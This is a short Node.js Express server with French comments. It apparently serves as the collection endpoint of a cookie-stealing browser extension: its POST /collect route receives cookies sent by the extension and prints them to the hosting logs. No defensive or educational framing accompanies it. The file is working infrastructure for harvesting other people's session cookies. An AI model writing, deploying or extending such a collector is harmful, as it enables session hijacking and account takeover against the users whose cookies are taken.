const express = require("express");
const app = express();

// Permet de lire le JSON envoyé par l'extension
app.use(express.json());

// Route POST pour collecter les cookies
app.post("/collect", (req, res) => {
  console.log("===== NOUVEAUX COOKIES =====");
  console.log(req.body.cookies); // Affiche tout dans les logs Render
  console.log("=============================");
  res.json({ status: "ok" });
});

// Optionnel : route GET pour tester dans le navigateur
app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

// Démarrage du serveur
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
